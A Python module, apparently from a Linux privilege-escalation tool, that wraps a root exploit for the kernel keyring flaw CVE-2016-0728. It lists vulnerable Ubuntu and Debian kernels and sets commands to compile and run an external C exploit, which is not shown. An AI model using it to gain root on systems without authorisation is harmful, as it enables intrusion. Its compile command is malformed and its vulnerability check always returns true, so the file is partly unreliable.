"""
CVE-2016-0728
"""
import os
from exploits.exploit import LinuxExploit
from constants import *
from src.kernels import KernelWindow


class CVE20160728(LinuxExploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE20160728"
		self.formatted_name = "CVE-2016-0728"
		self.e_type = "linux"
		self.brief_desc = "`join_session_keyring` function can be abused to get root NOTE: (takes about 30 minutes)"
		self.reliability = MEDIUM_RELIABILITY
		self.vulnerable_base = KernelWindow(GENERIC_LINUX, BASE_VULNERABLE, 3, 8, 0, 4, 4, 1)
		self.vulnerable_kernels = [
			KernelWindow(UBUNTU_15, VERSION_VULNERABLE, 0, 0, 0, 4, 2, 0, highest_patch_level="4.2.0-25.30"),
			KernelWindow(UBUNTU_15, VERSION_VULNERABLE, 0, 0, 0, 3, 19, 0, highest_patch_level="3.19.0-47.53"),
			KernelWindow(UBUNTU_14, VERSION_VULNERABLE, 0, 0, 0, 3, 13, 0, highest_patch_level="3.13.0-76.120"),
			KernelWindow(UBUNTU_12, VERSION_VULNERABLE, 0, 0, 0, 3, 13, 0, highest_patch_level="3.13.0-76.120~precise1"),
			KernelWindow(UBUNTU_GENERIC, BASE_VULNERABLE, 0, 0, 0, 3, 13, 0),
			KernelWindow(DEBIAN_9, VERSION_VULNERABLE, 0, 0, 0, 4, 3, 3, highest_patch_level="4.3.3-6"),
			KernelWindow(DEBIAN_8, VERSION_VULNERABLE, 0, 0, 0, 3, 16, 7, highest_patch_level="3.16.7-ckt20-1+deb8u3"),
			KernelWindow(DEBIAN_GENERIC, BASE_VULNERABLE, 0, 0, 0, 3, 16, 7),
		]
		self.exploit_kernels = [
			KernelWindow(UBUNTU_15, EXPLOIT_AVAILABLE, 0, 0, 0, 4, 2, 0, highest_patch_level="4.2.0-25.30"),
			KernelWindow(UBUNTU_15, EXPLOIT_AVAILABLE, 0, 0, 0, 3, 19, 0, highest_patch_level="3.19.0-47.53"),
			KernelWindow(UBUNTU_14, EXPLOIT_AVAILABLE, 0, 0, 0, 3, 13, 0, highest_patch_level="3.13.0-76.120"),
			KernelWindow(UBUNTU_12, EXPLOIT_AVAILABLE, 0, 0, 0, 3, 13, 0, highest_patch_level="3.13.0-76.120~precise1"),
			KernelWindow(DEBIAN_9, EXPLOIT_AVAILABLE, 0, 0, 0, 4, 3, 3, highest_patch_level="4.3.3-6"),
			KernelWindow(DEBIAN_8, EXPLOIT_AVAILABLE, 0, 0, 0, 3, 16, 7, highest_patch_level="3.16.7-ckt20-1+deb8u3"),
		]
		self.architecture = ARCHITECTURE_x86_64
		self.source_c_path = os.path.join(LINUX_EXPLOIT_SOURCE_PATH, "{}.c".format(self.name))
		self.compilation_path = os.path.join(PLAYGROUND_PATH, self.name)
		self.compilation_command = "apt-get libkeyutils-dev; gcc -o {} {} -lkeyutils -Wall".format(self.compilation_path, self.source_c_path)
		self.exploit_command = "{} {}".format(self.compilation_path, "PP_KEY")

	def determine_vulnerability(self):
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[+] system appears to be vulnerable to {}".format(self.name), color="green")
		return True